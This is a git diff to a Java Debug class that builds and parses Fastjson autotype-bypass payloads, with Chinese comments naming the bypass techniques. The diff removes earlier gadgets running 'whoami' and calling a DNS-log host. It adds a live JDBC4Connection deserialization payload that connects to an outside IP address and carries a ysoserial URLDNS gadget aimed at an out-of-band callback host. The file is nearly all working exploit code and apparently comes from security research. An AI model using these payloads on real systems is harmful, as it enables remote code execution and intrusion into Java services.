@@ -21,8 +21,23 @@ public class Debug {
         //利用AutoCloseablerable绕过autotype
         //String expStr="{\"a\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sorry.bug.customautocloseable\"},\"b\":{\"@type\":\"com.sorry.bug.customautocloseable\",\"command\":\"whoami\"}}";
         //利用Exception期望类绕过autotype
-        String expStr="{\"@type\":\"java.lang.Exception\",\"@type\":\"com.sorry.bug.customException\",\"s\":\"whoami\"}";
-        //String expStr="{\"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\":\"3j4mld.dns-log.com\",\"portToConnectTo\":80, \"info\": {\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"useSSL\":\"false\", \"user\":\"cp3\"}, \"databaseToConnectTo\":\"mysql\",\"url\":\"jdbc:mysql://127.0.0.1:3306/mysql\"}}}";
-        JSON.parse(expStr);
+        String payload_mysqljdbc = "{\"aaa\":{" +
+                "  \"@type\": \"java.lang.AutoCloseable\"," +
+                "  \"@type\": \"com.mysql.jdbc.JDBC4Connection\"," +
+                "  \"hostToConnectTo\": \"103.133.176.97\"," +
+                "  \"portToConnectTo\": 3306," +
+                "  \"info\": {" +
+                "    \"user\": \"yso_URLDNS_http://ssrf.nn15f3.dxyvro.cdns.me/\"," +
+                "    \"password\": \"pass\"," +
+                "    \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\"," +
+                "    \"autoDeserialize\": \"true\"," +
+                "    \"NUM_HOSTS\": \"1\"," +
+                "    \"maxAllowedPacket\": \"655360\" "+
+                "  }," +
+                "  \"databaseToConnectTo\": \"dbname\"," +
+                "  \"url\": \"\"" +
+                "}}";
+        System.out.println(payload_mysqljdbc);
+        JSON.parse(payload_mysqljdbc);
     }
 }
